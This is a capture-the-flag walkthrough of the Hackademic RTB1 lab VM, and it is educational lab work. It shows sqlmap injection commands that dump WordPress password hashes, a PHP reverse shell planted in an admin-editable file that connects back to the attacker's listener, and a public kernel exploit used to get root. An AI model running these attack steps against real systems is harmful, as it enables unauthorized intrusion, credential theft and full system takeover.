# Hackademic: RTB1

## 1.Get VM IP

```bash
root@kali: nmap -sn 192.168.127.0/24
                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 03:57 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00052s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.140
Host is up (0.0015s latency).
MAC Address: 00:0C:29:F6:75:CB (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00041s latency).
MAC Address: 00:50:56:EF:E6:A0 (VMware)
Nmap scan report for 192.168.127.128
Host is up.
```

The machine IP is `192.168.127.140`, lets enumerate it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.140 -oN fullscan

Nmap scan report for 192.168.127.140
Host is up (0.00079s latency).
Not shown: 988 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-server-header: Apache/2.2.15 (Fedora)
|_http-title: Hackademic.RTB1  
| http-methods: 
|_  Potentially risky methods: TRACE
MAC Address: 00:0C:29:F6:75:CB (VMware)
```


Visit the main page and click on `target` link and you will be redirected to `http://192.168.127.140/Hackademic_RTB1/`

let's fuzz this path :

```bash
root@kali: ffuf -w ~/wordlist/raft-large-directories.txt  -u http://192.168.127.140/Hackademic_RTB1/FUZZ/

[Status: 200, Size: 1160, Words: 64, Lines: 16, Duration: 11ms]
    * FUZZ: wp-content

[Status: 200, Size: 6523, Words: 301, Lines: 41, Duration: 13ms]
    * FUZZ: wp-includes

[Status: 200, Size: 2010, Words: 98, Lines: 20, Duration: 10ms]
    * FUZZ: wp-images

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 693ms]
    * FUZZ: wp-admin

[Status: 500, Size: 1881, Words: 127, Lines: 44, Duration: 681ms]
    * FUZZ:
```

we have found `wp-admin` directory and we find that it is like a wordpress CMS








back to main page, if you click on `Uncategorized` link on the bottom of the page a new url parameter will be used `cat=1`





this paramter is vulnerable to sql injection if you put a `"` after it :












i tried with `sqlmap` to inject into this paramter and get the database :

```bash
root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs

...
back-end DBMS: MySQL >= 5.0
[05:03:56] [INFO] fetching database names
[05:03:56] [INFO] resumed: 'information_schema'
[05:03:56] [INFO] resumed: 'mysql'
[05:03:56] [INFO] resumed: 'wordpress'
available databases [3]:
[*] information_schema
[*] mysql
[*] wordpress
...
```

all we need here is to get information from `wordpress` database.

- Get tables from this database :

```bash
root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs -D wordpress --tables

Database: wordpress
[9 tables]
+-------------------+
| wp_categories     |
| wp_comments       |
| wp_linkcategories |
| wp_links          |
| wp_options        |
| wp_post2cat       |
| wp_postmeta       |
| wp_posts          |
| wp_users          |
+-------------------+
```

interesting table would be `wp_users` so let's get information from it :

- Get columns of `wp_users` table :

```bash
root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs -D wordpress -T wp_users --columns

Database: wordpress
Table: wp_users
[22 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(60)         |
| user_aim            | varchar(50)         |
| user_browser        | varchar(200)        |
| user_description    | longtext            |
| user_domain         | varchar(200)        |
| user_email          | varchar(100)        |
| user_firstname      | varchar(50)         |
| user_icq            | int(10) unsigned    |
| user_idmode         | varchar(20)         |
| user_ip             | varchar(15)         |
| user_lastname       | varchar(50)         |
| user_level          | int(2) unsigned     |
| user_login          | varchar(60)         |
| user_msn            | varchar(100)        |
| user_nicename       | varchar(50)         |
| user_nickname       | varchar(50)         |
| user_pass           | varchar(64)         |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
| user_yim            | varchar(50)         |
+---------------------+---------------------+
```

interesting columns would be `user_login`, `user_pass`, `user_level`, `user_email`, let's get those infos :

- Get data from the desired columns :

```bash
root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs -D wordpress -T wp_users -C user_login,user_pass,user_level,user_email --dump

Database: wordpress                                                                                                                                             
Table: wp_users
[6 entries]
+--------------+---------------------------------------------+------------+-------------------------+
| user_login   | user_pass                                   | user_level | user_email              |
+--------------+---------------------------------------------+------------+-------------------------+
| NickJames    | 21232f297a57a5a743894a0e4a801fc3 (admin)    | 1          | NickJames@hacked.com    |
| MaxBucky     | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   | 0          | MaxBucky@hacked.com     |
| GeorgeMiller | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   | 10         | GeorgeMiller@hacked.com |
| JasonKonnors | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  | 0          | JasonKonnors@hacked.com |
| TonyBlack    | a6e514f9486b83cb53d8d932f9a04292 (napoleon) | 0          | TonyBlack@hacked.com    |
| JohnSmith    | b986448f0bb9e5e124ca91d3d650f52c            | 0          | JohnSmith@hacked        |
+--------------+---------------------------------------------+------------+-------------------------+
```

as we see here sqlmap has cracked some of the hashes and according to `user_level` user `GeorgeMiller` has the highest level of `10`

we use this user with credentials `GeorgeMiller:q1w2e3` to login to `/wp-admin` directory.


img:adminpage


## 3.Gaining Shell 

After checking various parts of the CMS i found that in `Manage` menu and in `Files` submenu we can edit a `hello.php` file.

i just paste a php reverse shell (pentestmonkey) payload and updated the file.

run a listener on you kali machine and navigate to `wp-content/plugins/hello.php`

```bash
root@kali: nv -nvlp 4444
          
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.140] 35822
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
 07:05:40 up  2:12,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=489(apache) groups=489(apache)
sh: no job control in this shell
sh-4.0$ id
id
uid=48(apache) gid=489(apache) groups=489(apache)
sh-4.0$
```

## 4.Privilege Escalation

now we are on the victim machine, after checking various PE vectors i came to nothing but checking the kernel version 

showed that this version is vulnerable :

```bash
sh-4.0$ uname -a

Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
```

just check the searchsploit for any public exploit for this version (you need to check a lot of exploit to find the appropriate one)

i just came to this exploit that worked for me

```bash
root@kali: searchsploit linux 2.6 -w | grep 1528
Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation                                                 | https://www.exploit-db.com/exploits/15285
```

upload it on the victim and compile it :

```bash
bash-4.0$ cd /tmp
bash-4.0$ gcc 15285.c 
bash-4.0$ ./a.out 
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
sh-4.0# id
uid=0(root) gid=0(root)
sh-4.0# 
```

yes, this is how we can root this machine :)













